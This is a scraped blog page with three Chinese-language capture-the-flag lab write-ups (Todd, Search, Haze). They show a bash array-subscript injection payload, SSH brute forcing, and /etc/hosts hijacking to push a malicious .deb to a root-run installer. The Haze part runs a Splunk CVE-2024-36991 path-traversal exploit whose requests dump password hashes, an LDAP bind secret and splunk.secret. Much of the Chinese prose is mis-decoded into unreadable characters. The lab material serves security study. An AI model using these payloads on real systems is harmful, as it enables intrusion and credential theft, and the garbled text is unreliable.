192.168.56.137\rHost is up (0.00028s latency).\rNot shown: 65522 closed tcp ports (reset)\rPORT STATE SERVICE VERSION\r22/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)\r| ssh-hostkey: | 2048 93:a4:92:55:72:2b:9b:4a:52:66:5c:af:a9:83:3c:fd (RSA)\r| 256 1e:a7:44:0b:2c:1b:0d:77:83:df:1d:9f:0e:30:08:4d (ECDSA)\r|_ 256 d0:fa:9d:76:77:42:6f:91:d3:bd:b5:44:72:a7:c9:71 (ED25519)\r80/tcp open http Apache httpd 2.4.59 ((Debian))\r|_http-title: Mindful Listening\r|_http-server-header: Apache/2.4.59 (Debian)\r7066/tcp open unknown\r7816/tcp open tcpwrapped\r9364/tcp open tcpwrapped\r10617/tcp open tcpwrapped\r11766/tcp open tcpwrapped\r13584/tcp open tcpwrapped\r14025/tcp open tcpwrapped\r19345/tcp open tcpwrapped\r25088/tcp open tcpwrapped\r27179/tcp open tcpwrapped\r27730/tcp open tcpwrapped ç„¶åè¿™ä¸ªç«¯å£å¯ä»¥è¿ä¸Šå»\nç„¶åæ‹¿åˆ°user.txt\nå†™å…¥sshå¯†é’¥è¿æ¥å³å¯\nRoot #\ræŸ¥çœ‹sudo -l\n$ sudo -l\rMatching Defaults entries for todd on todd:\renv_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\rUser todd may run the following commands on todd:\r(ALL : ALL) NOPASSWD: /bin/bash /srv/guess_and_check.sh\r(ALL : ALL) NOPASSWD: /usr/bin/rm\r(ALL : ALL) NOPASSWD: /usr/sbin/reboot æŸ¥çœ‹è¿™ä¸ªguess_and_check\n$ cat /srv/guess_and_check.sh\r#!/bin/bash\r# check this script used by human a=$((RANDOM%1000))\recho \u0026#34;Please Input [$a]\u0026#34;\recho \u0026#34;[+] Check this script used by human.\u0026#34;\recho \u0026#34;[+] Please Input Correct Number:\u0026#34;\rread -p \u0026#34;\u0026gt;\u0026gt;\u0026gt;\u0026#34; input_number\r[[ $input_number -ne \u0026#34;$a\u0026#34; ]] \u0026amp;\u0026amp; exit 1\rsleep 0.2\rtrue_file=\u0026#34;/tmp/$((RANDOM%1000))\u0026#34;\rsleep 1\rfalse_file=\u0026#34;/tmp/$((RANDOM%1000))\u0026#34;\r[[ -f \u0026#34;$true_file\u0026#34; ]] \u0026amp;\u0026amp; [[ ! -f \u0026#34;$false_file\u0026#34; ]] \u0026amp;\u0026amp; cat /root/.cred || exit 2 è¿™ä¸ªè„šæœ¬ /srv/guess_and_check.sh æ˜¯ä¸€ä¸ªç®€å•çš„ Bash è„šæœ¬ï¼Œæ‰§è¡Œä»¥ä¸‹æ“ä½œï¼š\nç”Ÿæˆä¸€ä¸ªéšæœºæ•°ï¼š\na=$((RANDOM%1000))ï¼šç”Ÿæˆä¸€ä¸ª 0 åˆ° 999 ä¹‹é—´çš„éšæœºæ•°ï¼Œå¹¶å°†å…¶èµ‹å€¼ç»™å˜é‡ aã€‚ æç¤ºç”¨æˆ·è¾“å…¥ï¼š\necho \u0026quot;Please Input [$a]\u0026quot;ï¼šå°†ç”Ÿæˆçš„éšæœºæ•°æ˜¾ç¤ºç»™ç”¨æˆ·ã€‚\nread -p \u0026quot;\u0026gt;\u0026gt;\u0026gt;\u0026quot; input_numberï¼šæç¤ºç”¨æˆ·è¾“å…¥ä¸€ä¸ªæ•°å­—ã€‚\næ£€æŸ¥ç”¨æˆ·è¾“å…¥ï¼š\n[[ $input_number -ne \u0026quot;$a\u0026quot; ]] \u0026amp;\u0026amp; exit 1ï¼šå¦‚æœç”¨æˆ·è¾“å…¥çš„æ•°å­—ä¸ç­‰äºç”Ÿæˆçš„éšæœºæ•° aï¼Œè„šæœ¬ä¼šä»¥çŠ¶æ€ç  1 é€€å‡ºã€‚ ç”Ÿæˆæ›´å¤šéšæœºæ–‡ä»¶ï¼š\ntrue_file=\u0026quot;/tmp/$((RANDOM%1000))\u0026quot; å’Œ false_file=\u0026quot;/tmp/$((RANDOM%1000))\u0026quot;ï¼šè„šæœ¬ç”Ÿæˆä¸¤ä¸ªä½äº /tmp ç›®å½•ä¸‹çš„éšæœºæ–‡ä»¶è·¯å¾„ã€‚ æ–‡ä»¶å­˜åœ¨æ€§æ£€æŸ¥ï¼š\n[[ -f \u0026quot;$true_file\u0026quot; ]] \u0026amp;\u0026amp; [[ ! -f \u0026quot;$false_file\u0026quot; ]]ï¼šå¦‚æœ true_file æŒ‡å®šçš„ä½ç½®å­˜åœ¨æ–‡ä»¶ï¼Œå¹¶ä¸” false_file æŒ‡å®šçš„ä½ç½®æ²¡æœ‰æ–‡ä»¶ï¼Œè„šæœ¬ä¼šç»§ç»­æ‰§è¡Œã€‚ æ˜¾ç¤ºå‡­è¯æ–‡ä»¶å†…å®¹ï¼š\ncat /root/.credï¼šå¦‚æœä¸Šè¿°æ¡ä»¶æˆç«‹ï¼ˆå³ true_file å­˜åœ¨è€Œ false_file ä¸å­˜åœ¨ï¼‰ï¼Œè„šæœ¬å°†æ˜¾ç¤º /root/.cred æ–‡ä»¶çš„å†…å®¹ï¼Œå‡è®¾è¯¥æ–‡ä»¶åŒ…å«æ•æ„Ÿä¿¡æ¯ã€‚\n|| exit 2ï¼šå¦‚æœæ¡ä»¶ä¸æˆç«‹ï¼Œè„šæœ¬å°†ä»¥çŠ¶æ€ç  2 é€€å‡ºã€‚\nåˆ†æï¼š #\rè¿™ä¸ªè„šæœ¬ /srv/guess_and_check.sh æ˜¯ä¸€ä¸ªç®€å•çš„ Bash è„šæœ¬ï¼Œæ‰§è¡Œä»¥ä¸‹æ“ä½œï¼š\nç”Ÿæˆä¸€ä¸ªéšæœºæ•°ï¼š\na=$((RANDOM%1000))ï¼šç”Ÿæˆä¸€ä¸ª 0 åˆ° 999 ä¹‹é—´çš„éšæœºæ•°ï¼Œå¹¶å°†å…¶èµ‹å€¼ç»™å˜é‡ aã€‚ æç¤ºç”¨æˆ·è¾“å…¥ï¼š\necho \u0026quot;Please Input [$a]\u0026quot;ï¼šå°†ç”Ÿæˆçš„éšæœºæ•°æ˜¾ç¤ºç»™ç”¨æˆ·ã€‚\nread -p \u0026quot;\u0026gt;\u0026gt;\u0026gt;\u0026quot; input_numberï¼šæç¤ºç”¨æˆ·è¾“å…¥ä¸€ä¸ªæ•°å­—ã€‚\næ£€æŸ¥ç”¨æˆ·è¾“å…¥ï¼š\n[[ $input_number -ne \u0026quot;$a\u0026quot; ]] \u0026amp;\u0026amp; exit 1ï¼šå¦‚æœç”¨æˆ·è¾“å…¥çš„æ•°å­—ä¸ç­‰äºç”Ÿæˆçš„éšæœºæ•° aï¼Œè„šæœ¬ä¼šä»¥çŠ¶æ€ç  1 é€€å‡ºã€‚ ç”Ÿæˆæ›´å¤šéšæœºæ–‡ä»¶ï¼š\ntrue_file=\u0026quot;/tmp/$((RANDOM%1000))\u0026quot; å’Œ false_file=\u0026quot;/tmp/$((RANDOM%1000))\u0026quot;ï¼šè„šæœ¬ç”Ÿæˆä¸¤ä¸ªä½äº /tmp ç›®å½•ä¸‹çš„éšæœºæ–‡ä»¶è·¯å¾„ã€‚ æ–‡ä»¶å­˜åœ¨æ€§æ£€æŸ¥ï¼š\n[[ -f \u0026quot;$true_file\u0026quot; ]] \u0026amp;\u0026amp; [[ ! -f \u0026quot;$false_file\u0026quot; ]]ï¼šå¦‚æœ true_file æŒ‡å®šçš„ä½ç½®å­˜åœ¨æ–‡ä»¶ï¼Œå¹¶ä¸” false_file æŒ‡å®šçš„ä½ç½®æ²¡æœ‰æ–‡ä»¶ï¼Œè„šæœ¬ä¼šç»§ç»­æ‰§è¡Œã€‚ æ˜¾ç¤ºå‡­è¯æ–‡ä»¶å†…å®¹ï¼š\ncat /root/.credï¼šå¦‚æœä¸Šè¿°æ¡ä»¶æˆç«‹ï¼ˆå³ true_file å­˜åœ¨è€Œ false_file ä¸å­˜åœ¨ï¼‰ï¼Œè„šæœ¬å°†æ˜¾ç¤º /root/.cred æ–‡ä»¶çš„å†…å®¹ï¼Œå‡è®¾è¯¥æ–‡ä»¶åŒ…å«æ•æ„Ÿä¿¡æ¯ã€‚\n|| exit 2ï¼šå¦‚æœæ¡ä»¶ä¸æˆç«‹ï¼Œè„šæœ¬å°†ä»¥çŠ¶æ€ç  2 é€€å‡ºã€‚\nè¯¥è„šæœ¬çš„è®¾è®¡ä¼¼ä¹æ˜¯ä¸ºäº†ç¡®è®¤æ˜¯å¦ç”±äººç±»ç”¨æˆ·æ‰§è¡Œï¼Œè¦æ±‚ç”¨æˆ·è¾“å…¥æ­£ç¡®çš„æ•°å­—ã€‚å¦‚æœç”¨æˆ·è¾“å…¥æ­£ç¡®çš„æ•°å­—ï¼Œè„šæœ¬ç»§ç»­æ£€æŸ¥ /tmp ç›®å½•ä¸‹çš„æ–‡ä»¶æ˜¯å¦å­˜åœ¨ã€‚å¦‚æœæ»¡è¶³æ¡ä»¶ï¼ˆtrue_file å­˜åœ¨ä¸” false_file ä¸å­˜åœ¨ï¼‰ï¼Œåˆ™æ˜¾ç¤º /root/.cred æ–‡ä»¶çš„å†…å®¹ï¼Œå¯èƒ½æš´éœ²æ•æ„Ÿä¿¡æ¯ã€‚\nMethod 1 #\ré¶æœºä½œè€…æä¾›çš„æ€è·¯\nå¯ä»¥å°†è¿™ä¸ªè„šæœ¬å†…å®¹å¤åˆ¶åˆ°æœ¬åœ°è¿›è¡Œè°ƒè¯•\n#!/bin/bash\r# check this script used by human a=$((RANDOM%1000))\recho \u0026#34;Generated a: $a\u0026#34;\recho \u0026#34;Please Input [$a]\u0026#34;\recho \u0026#34;[+] Check this script used by human.\u0026#34;\recho \u0026#34;[+] Please Input Correct Number:\u0026#34;\rread -p \u0026#34;\u0026gt;\u0026gt;\u0026gt;\u0026#34; input_number\r[[ $input_number -ne \u0026#34;$a\u0026#34; ]] \u0026amp;\u0026amp; exit 1\rsleep 0.2\rtrue_file=\u0026#34;/tmp/$((RANDOM%1000))\u0026#34;\recho \u0026#34;Generated true_file: $true_file\u0026#34;\rsleep 1\rfalse_file=\u0026#34;/tmp/$((RANDOM%1000))\u0026#34;\recho \u0026#34;Generated false_file: $false_file\u0026#34;\r[[ -f \u0026#34;$true_file\u0026#34; ]] \u0026amp;\u0026amp; [[ ! -f \u0026#34;$false_file\u0026#34; ]] \u0026amp;\u0026amp; cat /etc/shadow || exit 2 å¯ä»¥çœ‹åˆ°è¾“å…¥æ­£ç¡®çš„æ•°å­—ä¼šè¿›åˆ°ä¸‹ä¸€æ­¥ï¼Œè€Œè¾“å…¥é”™è¯¯ä¼šç›´æ¥åœæ­¢\næ³¨æ„åˆ°ä¸‹é¢è¿™ä¸ªé€»è¾‘ï¼Œä»–æ˜¯ç›´æ¥æŠŠè¾“å…¥çš„å­—ç¬¦ä¸²è½¬ä¸ºäº†ä¸€ä¸ªå˜é‡ï¼Œå¹¶ä¸”ä¸**$a**è¿›è¡Œæ¯”è¾ƒ\nread -p \u0026#34;\u0026gt;\u0026gt;\u0026gt;\u0026#34; input_number\r[[ $input_number -ne \u0026#34;$a\u0026#34; ]] \u0026amp;\u0026amp; exit 1 å› æ­¤è¿™é‡Œå°±å­˜åœ¨ä¸€ä¸ªæ³¨å…¥ç‚¹ï¼Œè¾“å…¥çš„æ˜¯aé‚£ä¹ˆä¹Ÿèƒ½æ¯”è¾ƒæˆåŠŸ\nå¦‚æœè¾“å…¥çš„æ˜¯ä¸€ä¸ªæ•°ç»„ï¼Œé‚£ä¹ˆæ•°ç»„å’Œä¸€ä¸ªéæ•°ç»„ç±»å‹è¿›è¡Œæ¯”è¾ƒä¼šè§¦å‘è¯­æ³•é”™è¯¯ã€‚å¹¶ä¸”ä¼šè¾“å‡ºé”™è¯¯ä¿¡æ¯\nå±äºæ˜¯**a[$(id)]**è¿™é‡Œä¼šå…ˆè§£ææœ€é‡Œé¢çš„idä½œä¸ºä¸€ä¸ªå‘½ä»¤ï¼Œç„¶åç»“æœä½œä¸ºæ•°ç»„ä¸‹æ ‡ï¼Œç„¶åæ¯”è¾ƒçš„æ—¶å€™ä¼šè§¦å‘è¯­æ³•é”™è¯¯ï¼Œè¾“å‡ºé”™è¯¯ä¿¡æ¯ã€‚ä»è€Œå¾—åˆ°æˆ‘ä»¬æƒ³è¦çš„å‘½ä»¤ç»“æœã€‚\nMethod 2 #\rçº¯é è¿æ°”å¼\nå…ˆåˆ›å»ºä¸€éƒ¨åˆ†æ•°å­—æ–‡ä»¶åœ¨tmpç›®å½•ä¸‹\ncd tmp\rtouch {0..500} ç„¶åå¼€å§‹ç¢°è¿æ°”ï¼Œè¿æ°”å¥½çš„è¯ï¼Œå‡ æ¬¡å°±èƒ½å‡ºï¼Œå¾—åˆ°rootçš„å¯†ç æ˜¯ï¼šfake passwordï¼ˆä¸­é—´æœ‰ç©ºæ ¼ï¼‰\nSummary #\rUserï¼šè¿æ¥nmapæ‰«åˆ°çš„ç«¯å£å°±è¡Œã€‚\nRootï¼šè¾“å…¥å­—ç¬¦ä¸²ç»è¿‡ç±»å‹è½¬æ¢ï¼Œå­˜åœ¨æ•°ç»„ä¸‹æ ‡è§£æå‘½ä»¤çš„é—®é¢˜ï¼Œå¯¼è‡´å‘½ä»¤æ‰§è¡Œåçš„ç»“æœè¢«è¯­æ³•é”™è¯¯ä¿¡æ¯å¸¦å‡ºã€‚ä¹Ÿå¯ä»¥ç¢°è¿æ°”ï¼Œæ¯•ç«Ÿæ˜¯éšæœºæ•°ã€‚\nã€Toddé¶æœºè®¾è®¡æ€è·¯å¤ç›˜ã€‘\n","date":"2025-04-02","externalUrl":null,"permalink":"/posts/2025/04/hackmyvm-todd/","section":"Posts","summary":"","title":"HackMyVM-Todd","type":"posts"},{"content":"\rBox Info #\rOS Linux Difficulty Easy Nmap #\r[root@kali] /home/kali/Search â¯ nmap 192.168.56.136 -sV -A -p-\rPORT STATE SERVICE VERSION\r22/tcp open ssh OpenSSH 9.2p1 Debian 2+deb12u5 (protocol 2.0)\r| ssh-hostkey: | 256 39:0d:70:e0:55:cb:20:de:ad:f7:10:d8:1f:76:4d:9d (ECDSA)\r|_ 256 df:e2:94:52:e9:3d:eb:69:2d:b4:a5:a9:2c:3e:63:46 (ED25519)\r80/tcp open http Apache httpd 2.4.62 ((Debian))\r|_http-server-header: Apache/2.4.62 (Debian)\r|_http-title: Apache2 Debian Default Page: It works å¾—åˆ°ç”¨æˆ·åæ˜¯support\nHydra #\r[root@kali] /home/kali â¯ hydra -l support -P /usr/share/wordlists/rockyou.txt ssh://192.168.56.136 -I -V å¾—åˆ°å¯†ç æ˜¯liverpool\nRoot #\ræŸ¥çœ‹sudo -l\nsupport@debian:~$ sudo -l\rMatching Defaults entries for support on debian:\renv_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin, use_pty\rUser support may run the following commands on debian:\r(ALL) NOPASSWD: /usr/bin/check å¹¶ä¸”è¿™ä¸ªæ–‡ä»¶ä¸å¯è¯»\nsupport@debian:~$ file /usr/bin/check\r/usr/bin/check: executable, regular file, no read permission\rsupport@debian:~$ ls -al /usr/bin/check\r-rwx--x--x 1 root root 548 Mar 27 17:17 /usr/bin/check é‚£å°±çœ‹çœ‹è¿è¡Œè¾“å‡º\nsupport@debian:~$ sudo /usr/bin/check\rReading package lists... Done\rBuilding dependency tree... Done\rReading state information... Done\rcurl is already the newest version (7.88.1-10+deb12u12).\r0 upgraded, 0 newly installed, 0 to remove and 64 not upgraded.\rReading package lists... Done\rBuilding dependency tree... Done\rReading state information... Done\rapache2 is already the newest version (2.4.62-1~deb12u2).\r0 upgraded, 0 newly installed, 0 to remove and 64 not upgraded.\rWarning: apt-key is deprecated. Manage keyring files in trusted.gpg.d instead (see apt-key(8)).\rgpg: no valid OpenPGP data found.\r--2025-04-02 03:01:57-- https://pkg.jenkins.io/debian-stable/binary/jenkins_2.46.1_all.deb\rResolving pkg.jenkins.io (pkg.jenkins.io)... failed: Temporary failure in name resolution.\rwget: unable to resolve host address â€˜pkg.jenkins.ioâ€™\rdpkg-deb: error: unexpected end of file in archive magic version number in /root/jenkins_2.46.1_all.deb\rdpkg: error processing archive /root/jenkins_2.46.1_all.deb (--install):\rdpkg-deb --control subprocess returned error exit status 2\rErrors were encountered while processing:\r/root/jenkins_2.46.1_all.deb çœ‹èµ·æ¥ä»–æ˜¯è¦å»pkg.jenkins.ioè¿™é‡Œä¸‹è½½ä¸€ä¸ªdebåŒ…ï¼Œç„¶åå®‰è£…ã€‚\næ³¨æ„åˆ°**/etc/hosts**æ˜¯å¯ä»¥å†™å…¥çš„\nå› æ­¤åŠ«æŒåŸŸå\nsupport@debian:~$ cat /etc/hosts\r127.0.0.1 localhost\r127.0.1.1 debian\r# The following lines are desirable for IPv6 capable hosts\r::1 localhost ip6-localhost ip6-loopback\rff02::1 ip6-allnodes\rff02::2 ip6-allrouters\r192.168.56.118 pkg.jenkins.io åœ¨æœ¬åœ°å¼€å¯ä¸€ä¸ªhttpsçš„æœåŠ¡ï¼Œå…ˆç”Ÿæˆè¯ä¹¦ï¼Œéšæ„è¾“å…¥å³å¯\n[root@kali] /home/kali/Search â¯ openssl req -new -x509 -keyout server.pem -out server.pem -days 365 -nodes pythonè„šæœ¬ï¼Œæ³¨æ„ç«¯å£è¦å¼€åœ¨443\nimport http.server\rimport ssl\rPORT = 443 # ç›‘å¬ç«¯å£\rCERT_FILE = \u0026#34;server.pem\u0026#34; # è¯ä¹¦æ–‡ä»¶\r# åˆ›å»º HTTP æœåŠ¡å™¨\rserver_address = (\u0026#34;0.0.0.0\u0026#34;, PORT)\rhandler = http.server.SimpleHTTPRequestHandler\rhttpd = http.server.HTTPServer(server_address, handler)\r# ä½¿ç”¨ SSLContext ä»£æ›¿ wrap_socket\rcontext = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)\rcontext.load_cert_chain(certfile=CERT_FILE)\r# ç»‘å®š SSL\rhttpd.socket = context.wrap_socket(httpd.socket, server_side=True)\rprint(f\u0026#34;Serving HTTPS on port {PORT}...\u0026#34;)\rhttpd.serve_forever() dpkg | GTFOBins æ ¹æ®è¦æ±‚ç”Ÿæˆæ¶æ„debåŒ…ä¹‹åï¼Œåœ¨httpsæœåŠ¡ä¸­æ³¨æ„ç›®å½•ç»“æ„\nå¼€å¯æœåŠ¡åï¼Œè¿è¡Œcheck\nææƒæˆåŠŸï¼å¯ä»¥çœ‹åˆ°checkçš„å†…å®¹å°±æ˜¯è¿œç¨‹ä¸‹è½½debï¼Œç„¶ådpkg -i å®‰è£…ã€‚\nSummary #\rUserï¼šç½‘ç«™æ³¨é‡Šä¸­æ³„éœ²ç”¨æˆ·åï¼Œå°è¯•sshç™»å½•çˆ†ç ´\nRootï¼šhostsåŠ«æŒï¼Œä¸‹è½½æ¶æ„debåŒ…å¾—åˆ°rootæƒé™ã€‚\n","date":"2025-04-02","externalUrl":null,"permalink":"/posts/2025/04/vulnvm-search/","section":"Posts","summary":"","title":"VulnVM-Search","type":"posts"},{"content":"\rBox Info #\rOS Windows Difficulty Hard Nmap #\r[root@kali] /home/kali â¯ nmap Haze.htb -sV -A PORT STATE SERVICE VERSION\r53/tcp open domain Simple DNS Plus\r88/tcp open kerberos-sec Microsoft Windows Kerberos 135/tcp open msrpc Microsoft Windows RPC\r139/tcp open netbios-ssn Microsoft Windows netbios-ssn\r389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: haze.htb0., Site: Default-First-Site-Name)\r| ssl-cert: Subject: commonName=dc01.haze.htb\r| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:\u0026lt;unsupported\u0026gt;, DNS:dc01.haze.htb\r| Not valid before: 2025-03-05T07:12:20\r|_Not valid after: 2026-03-05T07:12:20\r|_ssl-date: TLS randomness does not represent time\r445/tcp open microsoft-ds?\r464/tcp open kpasswd5?\r593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0\r636/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: haze.htb0., Site: Default-First-Site-Name)\r| ssl-cert: Subject: commonName=dc01.haze.htb\r| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:\u0026lt;unsupported\u0026gt;, DNS:dc01.haze.htb\r| Not valid before: 2025-03-05T07:12:20\r|_Not valid after: 2026-03-05T07:12:20\r|_ssl-date: TLS randomness does not represent time\r3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: haze.htb0., Site: Default-First-Site-Name)\r|_ssl-date: TLS randomness does not represent time\r| ssl-cert: Subject: commonName=dc01.haze.htb\r| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:\u0026lt;unsupported\u0026gt;, DNS:dc01.haze.htb\r| Not valid before: 2025-03-05T07:12:20\r|_Not valid after: 2026-03-05T07:12:20\r3269/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: haze.htb0., Site: Default-First-Site-Name)\r|_ssl-date: TLS randomness does not represent time\r| ssl-cert: Subject: commonName=dc01.haze.htb\r| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:\u0026lt;unsupported\u0026gt;, DNS:dc01.haze.htb\r| Not valid before: 2025-03-05T07:12:20\r|_Not valid after: 2026-03-05T07:12:20\r8000/tcp open http Splunkd httpd\r| http-title: Site doesn\u0026#39;t have a title (text/html; charset=UTF-8).\r|_Requested resource was http://Haze.htb:8000/en-US/account/login?return_to=%2Fen-US%2F\r|_http-server-header: Splunkd\r| http-robots.txt: 1 disallowed entry |_/\r8088/tcp open ssl/http Splunkd httpd\r|_http-server-header: Splunkd\r|_http-title: 404 Not Found\r| ssl-cert: Subject: commonName=SplunkServerDefaultCert/organizationName=SplunkUser\r| Not valid before: 2025-03-05T07:29:08\r|_Not valid after: 2028-03-04T07:29:08\r| http-robots.txt: 1 disallowed entry |_/\r8089/tcp open ssl/http Splunkd httpd\r|_http-title: splunkd\r| ssl-cert: Subject: commonName=SplunkServerDefaultCert/organizationName=SplunkUser\r| Not valid before: 2025-03-05T07:29:08\r|_Not valid after: 2028-03-04T07:29:08\r| http-robots.txt: 1 disallowed entry |_/\r|_http-server-header: Splunkd dc01.haze.htbæ·»åŠ åˆ°**/etc/hosts**\nCVE-2024-36991 #\råœ¨8089ç«¯å£ä¸Šèƒ½çœ‹åˆ°æœåŠ¡ç‰ˆæœ¬\n[root@kali] /home/kali/Haze/CVE-2024-36991 (main) â¯ python CVE-2024-36991.py -u http://haze.htb:8000/ ______ _______ ____ ___ ____ _ _ _____ __ ___ ___ _ / ___\\ \\ / | ____| |___ \\ / _ |___ \\| || | |___ / / /_ / _ \\ / _ \\/ | | | \\ \\ / /| _| _____ __) | | | |__) | || |_ _____ |_ \\| \u0026#39;_ | (_) | (_) | | | |___ \\ V / | |__|_____/ __/| |_| / __/|__ _|________) | (_) \\__, |\\__, | | \\____| \\_/ |_____| |_____|\\___|_____| |_| |____/ \\___/ /_/ /_/|_| -\u0026gt; POC CVE-2024-36991. This exploit will attempt to read Splunk /etc/passwd file. -\u0026gt; By x.com/MohamedNab1l\r-\u0026gt; Use Wisely.\r[INFO] Log directory created: logs\r[INFO] Testing single target: http://haze.htb:8000/\r[VLUN] Vulnerable: http://haze.htb:8000/\r:admin:$6$Ak3m7.aHgb/NOQez$O7C8Ck2lg5RaXJs9FrwPr7xbJBJxMCpqIx3TG30Pvl7JSvv0pn3vtYnt8qF4WhL7hBZygwemqn7PBj5dLBm0D1::Administrator:admin:changeme@example.com:::20152\r:edward:$6$3LQHFzfmlpMgxY57$Sk32K6eknpAtcT23h6igJRuM1eCe7WAfygm103cQ22/Niwp1pTCKzc0Ok1qhV25UsoUN4t7HYfoGDb4ZCv8pw1::Edward@haze.htb:user:Edward@haze.htb:::20152\r:mark:$6$j4QsAJiV8mLg/bhA$Oa/l2cgCXF8Ux7xIaDe3dMW6.Qfobo0PtztrVMHZgdGa1j8423jUvMqYuqjZa/LPd.xryUwe699/8SgNC6v2H/:::user:Mark@haze.htb:::20152\r:paul:$6$Y5ds8NjDLd7SzOTW$Zg/WOJxk38KtI.ci9RFl87hhWSawfpT6X.woxTvB4rduL4rDKkE.psK7eXm6TgriABAhqdCPI4P0hcB8xz0cd1:::user:paul@haze.htb:::20152 æ‰¾åˆ°å¯èƒ½å­˜åœ¨çš„ç”¨æˆ·\nEdward@haze.htb\rMark@haze.htb\rpaul@haze.htb ä½†æ˜¯å¯†ç å“ˆå¸Œæ— æ³•è¢«ç ´è§£\nCritical Splunk Vulnerability CVE-2024-36991: Patch Now to Prevent Arbitrary File Reads çœ‹åˆ°èƒ½æˆåŠŸè¯»å–æ–‡ä»¶\nå› æ­¤å¯ä»¥å°è¯•è¯»å–Splunkçš„é…ç½®æ–‡ä»¶ï¼Œå¯ä»¥çœ‹åˆ°é»˜è®¤çš„å®‰è£…ç›®å½•æ˜¯\nC:\\Program Files\\Splunk Splunkç›®å½•ç»“æ„åŠå¸¸ç”¨é…ç½®æ–‡ä»¶_å¦‚ä½•æŸ¥çœ‹splunkçš„å®¶ç›®å½•-CSDNåšå®¢\nList of configuration files - Splunk Documentation\nå¯ä»¥æŸ¥çœ‹åˆ°authentication.confçš„å†…å®¹\nGET /en-US/modules/messaging/C:../C:../C:../C:../C:../C:../C:../C:../C:../C:../C:/Program%20Files/Splunk/etc/system/local/authentication.conf HTTP/1.1\rHost: haze.htb:8000\rUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0\rAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8\rAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\rAccept-Encoding: gzip, deflate, br\rConnection: keep-alive\rUpgrade-Insecure-Requests: 1\rPriority: u=0, i\r---------------------\r[splunk_auth]\rminPasswordLength = 8\rminPasswordUppercase = 0\rminPasswordLowercase = 0\rminPasswordSpecial = 0\rminPasswordDigit = 0\r[Haze LDAP Auth]\rSSLEnabled = 0\ranonymous_referrals = 1\rbindDN = CN=Paul Taylor,CN=Users,DC=haze,DC=htb\rbindDNpassword = $7$ndnYiCPhf4lQgPhPu7Yz1pvGm66Nk0PpYcLN+qt1qyojg4QU+hKteemWQGUuTKDVlWbO8pY=\rcharset = utf8\remailAttribute = mail\renableRangeRetrieval = 0\rgroupBaseDN = CN=Splunk_LDAP_Auth,CN=Users,DC=haze,DC=htb\rgroupMappingAttribute = dn\rgroupMemberAttribute = member\rgroupNameAttribute = cn\rhost = dc01.haze.htb\rnestedGroups = 0\rnetwork_timeout = 20\rpagelimit = -1\rport = 389\rrealNameAttribute = cn\rsizelimit = 1000\rtimelimit = 15\ruserBaseDN = CN=Users,DC=haze,DC=htb\ruserNameAttribute = samaccountname\r[authentication]\rauthSettings = Haze LDAP Auth\rauthType = LDAP å°è¯•å¯¹å¯†ç è¿›è¡Œè§£å¯†\nHurricaneLabs/splunksecrets: splunksecrets is a tool for working with Splunk secrets offline éœ€è¦splunk.secretå‚æ•°\nGET /en-US/modules/messaging/C:../C:../C:../C:../C:../C:../C:../C:../C:../C:../C:/Program%20Files/Splunk/etc/auth/splunk.secret HTTP/1.1\rHost: haze.htb:8000\rUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0\rAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8\rAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\rAccept-Encoding: gzip, deflate, br\rConnection: keep-alive\rUpgrade-Insecure-Requests: 1\rPriority: u=0, i\r---------\rNfKeJCdFGKUQUqyQmnX/WM9xMn5uVF32qyiofYPHkEOGcpMsEN.lRPooJnBdEL5Gh2wm12jKEytQoxsAYA5mReU9.h0SYEwpFMDyyAuTqhnba9P2Kul0dyBizLpq6Nq5qiCTBK3UM516vzArIkZvWQLk3Bqm1YylhEfdUvaw1ngVqR1oRtg54qf4jG0X16hNDhXokoyvgb44lWcH33FrMXxMvzFKd5W3TaAUisO6rnN0xqB7cHbofaA1YV9vgD å¾—åˆ°å¯†ç \nå¯ä»¥çœ‹åˆ°å¯†ç æ˜¯æ­£ç¡®çš„\nç›®æ ‡æœºå™¨å¼€å¯äº†5985ç«¯å£ï¼Œä½†æ˜¯è¿™ä¸ªè´¦æˆ·ç™»å½•ä¸ä¸Šå»\nUserEnum #\ræŸ¥çœ‹å…¶ä»–ç”¨æˆ·\n[root@kali] /home/kali/Haze â¯ crackmapexec smb haze.htb -u \u0026#39;paul.taylor\u0026#39; -p \u0026#39;Ld@p_Authxxxxxxxxxx\u0026#39; --rid-brute | grep \u0026#39;SidTypeUser\u0026#39; â\rSMB Haze.htb 445 DC01 500: HAZE\\Administrator (SidTypeUser)\rSMB Haze.htb 445 DC01 501: HAZE\\Guest (SidTypeUser)\rSMB Haze.htb 445 DC01 502: HAZE\\krbtgt (SidTypeUser)\rSMB Haze.htb 445 DC01 1000: HAZE\\DC01$ (SidTypeUser)\rSMB Haze.htb 445 DC01 1103: HAZE\\paul.taylor (SidTypeUser)\rSMB Haze.htb 445 DC01 1104: HAZE\\mark.adams (SidTypeUser)\rSMB Haze.htb 445 DC01 1105: HAZE\\edward.martin (SidTypeUser)\rSMB Haze.htb 445 DC01 1106: HAZE\\alexander.green (SidTypeUser)\rSMB Haze.htb 445 DC01 1111: HAZE\\Haze-IT-Backup$ (SidTypeUser) 